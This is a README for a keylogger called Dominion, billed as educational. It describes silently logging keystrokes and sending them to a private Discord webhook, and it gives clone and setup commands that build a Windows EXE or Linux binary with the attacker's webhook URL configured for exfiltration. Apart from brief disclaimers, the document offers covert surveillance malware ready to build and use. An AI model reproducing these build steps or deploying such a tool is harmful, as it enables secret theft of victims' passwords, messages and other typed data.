![Dominion Banner](assets/dominion_banner.png)

# Dominion Keylogger

Dominion is an educational cross-platform keylogger that logs keystrokes and sends them to a private Discord channel using webhooks.
Fully automated — build for Windows or Linux.

Educational Use Only! This project is for ethical hacking and red team research.

---

## Features

- Log keystrokes silently.
- Send logs to Discord webhook.
- Supports Windows EXE (via Wine) and Linux binary.
- Easy setup script (setup.py).

---

## Setup

Clone this repository:

git clone https://github.com/YourUsername/Dominion.git

cd Dominion

Run the setup script:

python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --windows

or for Linux:

python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --linux

The setup script:

Checks Python and Wine.
Installs dependencies if missing.
Builds your EXE or binary to /dist/.

Example:

python3 setup.py --webhook https://discord.com/api/webhooks/XXXXX/YYYYY --windows

Legal Notice
This tool is for educational purposes only.
Use it responsibly on your own machines, test environments, or with explicit permission.

License
This project is licensed under the MIT License.
See LICENSE for details.
